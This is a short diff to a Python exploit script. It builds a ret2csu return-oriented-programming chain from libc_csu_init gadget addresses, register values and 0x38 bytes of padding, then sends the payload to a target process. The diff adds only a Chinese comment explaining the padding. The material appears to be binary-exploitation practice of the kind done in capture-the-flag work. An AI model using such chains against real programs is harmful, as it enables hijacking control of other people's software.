@@ -29,6 +29,7 @@ def getControl(rbx, rbp, r12, r13, r14, r15, last):
     payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
         r13) + p64(r14) + p64(r15)
     payload += p64(csu_front_addr)
+    # 七个字长, 用于ret前负载pop
     payload += b'a' * 0x38
     payload += p64(last)
     sh.sendline(payload)
